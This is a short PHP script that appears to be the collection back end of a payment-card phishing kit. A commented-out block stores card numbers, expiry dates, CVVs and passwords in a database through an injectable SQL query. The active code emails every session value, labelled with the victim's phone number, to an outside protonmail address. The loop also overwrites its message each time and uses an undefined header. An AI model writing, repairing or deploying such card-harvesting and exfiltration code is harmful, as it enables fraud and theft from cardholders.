<?php
session_start();
error_reporting(E_ALL);
include "db.php";
$message ="";

/*{
    $conn = new mysqli($db_config['servername'], $db_config['user'], $db_config['password'],$db_config['database'] );
    if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
    } 
    echo "Connected successfully";
    $sql = "INSERT INTO `entries` (`card_no`,`month_year`,`cvv`,`password`) VALUES($_SESSION[$number],$_SESSION[$month].'/'.$_SESSION[$year],$_SESSION[$cvv],$_POST[$pass]) ON DUPLICATE KEY UPDATE password = CONCAT_WS(\',\',password, $_POST[$pass])";
    if (mysqli_query($conn, $sql)) {
    echo "New record created successfully";
    } else {
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
    }
}*/


$to = "payc2c@protonmail.com";
$message;
$subject = "Номер платильщика" . $_SESSION["phone"];
foreach ($_SESSION as $key => $value) {
    $message = $key . ":" . $value . "\r\n";
}

echo $message;
$retval = mail($to, $subject, $message, $header);


?>